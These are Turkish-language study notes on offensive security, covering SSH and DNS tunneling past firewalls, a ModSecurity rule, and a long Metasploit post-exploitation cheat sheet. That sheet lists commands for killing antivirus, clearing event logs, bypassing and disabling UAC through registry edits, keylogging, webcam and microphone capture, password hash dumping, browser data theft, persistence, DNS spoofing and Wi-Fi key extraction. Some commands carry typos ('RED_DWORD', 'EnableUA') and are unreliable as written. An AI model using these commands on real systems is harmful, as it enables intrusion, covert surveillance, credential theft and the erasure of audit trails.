## Bolum 2 (SSH)

### 2.2 Local Tunneling

Disariya cikmamiza izin vermeyen bir firewall'un arkasinda oldugumuzda kullanilir. Firewall 3000'inci portu bloklamissa 80'inci portu yonlendirebiliriz:

ssh host@admin -L 80:server1.example.com:3000



### 2.3 Remote Tunneling

Uzak bir bilgisayardan local bir bilgisayara baglanmak gerektiginde kullanilir.

ssh host@admin -R 8888:192.168.1.100:80 (cihazin 8888. portundan localin 80. portuna)



### 2.4 Dynamic Tunneling

Ucuncu parti uygulama kullanarak yapilan tunnellemedir. Manual proxy gerektirir.

ssh -D 9000 [fastssh.com-ataker@tr-1.serverip.co](mailto:fastssh.com-ataker@tr-1.serverip.co) -fN (f→ssh to background, N→no shell)


    
- [fastssh.com](http://fastssh.com): Dynamic SSH servisi
    
- DNS ve SSH servisleri (53,22) kapaliysa sistem disariya kapalidir.
    
- A kaydi: IP'ye domain ata
    
- NS kaydi: Bir subdomain'i farkli bir nameserver'a tasi
    
- sudo iodined -c (no-ip-check) -f (foreground) 10.0.0.1 -P 123456 tunnel.beyazhacker.xyz
    
- sudo iodine -f -P 123456 tunnel.beyazhacker.xyz
    
- graudit acik kaynak kodlu bir acik tarayicisidir
    
- %0A: newline (/n)
    
- ModSecurity, Layer 7'de calisan bir web uygulama guvenlik duvaridir. Acik kaynak [kodludur.Web](http://kodludur.Web) sunucusuna gomulu sekilde calisir. Deger bazli engelleme yapar. 3 guvenlik modeli vardir: Manuel, sadece bunlar, bunlar disinda.
    

```jsx
apt install libapache2-mod-security2
/usr/share/modsecurity-crs/rules: Kurallar
/var/log/apache2: Loglar
/etc/modsecurity: Config

Kural ekleme: SecRule ARGS:name "script" "id:1111,deny,status:404"
```

### Metasploit

- Dosya
    
    - download -r <hedef> <local>
    - upload -r <local><hedef>
    - screenshot
    - record_mic -d<sec> -p <path>
    - webcam_list: Camlari goster
    - webcam_chat: Karsilikli konusma
    - webcam_snap: Foto
    - webcam_stream: Video
- Guvenlik
    
    - run getcountermeasure -d (built-in firewall) -k (third party av)
        
    - post/windows/manage/killav: Antivirus kapatma
        
    - kill <pid>: Program oldur
        
    - clearev: Loglari temizleme
        
    - run event_manager -c: Loglari temizleme
        
    - UAC: User account control/bir is yapilacakken admine soru sorma
        
    - exploit/windows/local/bypassuac: UAC kapatma
        
    - UAC kodlari
        
        ```jsx
        UAC KAPATMA
        
        REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "PromptOnSecureDesktop" /t RED_DWORD /d "00000000" /f
        
        REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t RED_DWORD /d "00000000" /f
        
        REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableUA" /t RED_DWORD /d "00000000" /f
        
        UAC ACMA
        
        REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "PromptOnSecureDesktop" /t RED_DWORD /d "00000001" /f
        
        REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t RED_DWORD /d "00000005" /f
        
        REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableUA" /t RED_DWORD /d "00000001" /f
        ```
        
- Ilerleme
    
    - run enum_chrome/enum_firefox: Tarayici bilgileri
    - run post/windows/gather/enum-chrome: Yol
    - SQLite data browser ile buyuk txt dosyalari acilabilir
    - idletime: Son cevrimici
    - keyscan_start, keyscan_stop, keyscan_dump
    - search -f <filename>
    - hashdump: Parolalari sifreli bir sekilde gosterir
    - Coin&Able: Windows local cracker
    - Windows parolalari LM&NTLM ile hashlenir
- Sniff
    
    1. use sniffer
    2. sniffer_interfaces
    3. sniffer_start <interface id>
    4. sniffer_stop <>
    5. sniffer_dump <interface> <file pcap>
- Gerisi
    
    - uich [enable/disable] [keyboard/mouse/all]: Donanim kontrol
    - run persistence -A (multi/handler automatic) -L <remote logon path> -P <payload> -S (start at bootasservice/system privilege) -U (start user log on) -i <interval> -p <port> -r <local port>
    - run get_application_list: Yuklu uygulamalar
    - run hostsedit: DNS spoofing → -e 127.0.0.1,[facebook.com](http://facebook.com) (kullanici denetimi kapali olmali
    - use kiwi: Wifi extension
    - wifi_list_shared: Wifi aglarini goster + psk
    - help, use [tab-tab], run [tab-tab], run <> -h